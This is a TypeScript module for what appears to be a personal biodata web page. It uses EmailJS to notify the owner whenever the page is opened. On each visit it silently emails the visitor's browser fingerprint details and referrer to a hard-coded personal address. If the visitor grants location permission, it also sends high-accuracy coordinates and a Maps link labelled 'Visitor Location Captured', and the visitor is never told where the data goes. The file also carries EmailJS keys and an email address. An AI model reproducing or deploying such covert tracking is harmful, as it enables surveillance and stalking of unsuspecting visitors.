import emailjs from "@emailjs/browser";

// TODO: Replace these dummy values with your real EmailJS credentials
export const EMAILJS_CONFIG = {
  SERVICE_ID: "service_yhpa91x",
  TEMPLATE_ID: "template_s71j8d7",
  PUBLIC_KEY: "t_7GFFUEQgfM5c5kj",
};

let initialized = false;
const ensureInit = () => {
  if (!initialized) {
    emailjs.init({ publicKey: EMAILJS_CONFIG.PUBLIC_KEY });
    initialized = true;
  }
};

const getVisitorInfo = () => {
  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screen = `${window.screen.width}x${window.screen.height}`;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const referrer = document.referrer || "Direct";
  return `User-Agent: ${ua}\nLanguage: ${lang}\nScreen: ${screen}\nTimezone: ${tz}\nReferrer: ${referrer}\nPage: ${window.location.href}`;
};

export const sendVisitEmail = async () => {
  try {
    ensureInit();
    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
      email: "shubhamsc9799@gmail.com",
      subject: "📄 Biodata Page Opened",
      message: "Someone just opened your biodata page.",
      location: "Not requested yet",
      visitor_info: getVisitorInfo(),
      timestamp: new Date().toLocaleString(),
    });
  } catch (e) {
    console.error("Visit email failed:", e);
  }
};

export const sendLocationEmail = async () => {
  if (!("geolocation" in navigator)) return;
  return new Promise<void>((resolve) => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          ensureInit();
          const { latitude, longitude, accuracy } = pos.coords;
          const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
          await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
            subject: "📍 Visitor Location Captured",
            message: `Visitor allowed location access.\n\nGoogle Maps: ${mapsUrl}`,
            location: `Lat: ${latitude}, Lng: ${longitude} (accuracy ~${Math.round(accuracy)}m)\n${mapsUrl}`,
            visitor_info: getVisitorInfo(),
            timestamp: new Date().toLocaleString(),
          });
        } catch (e) {
          console.error("Location email failed:", e);
        }
        resolve();
      },
      (err) => {
        console.warn("Location denied:", err.message);
        resolve();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};
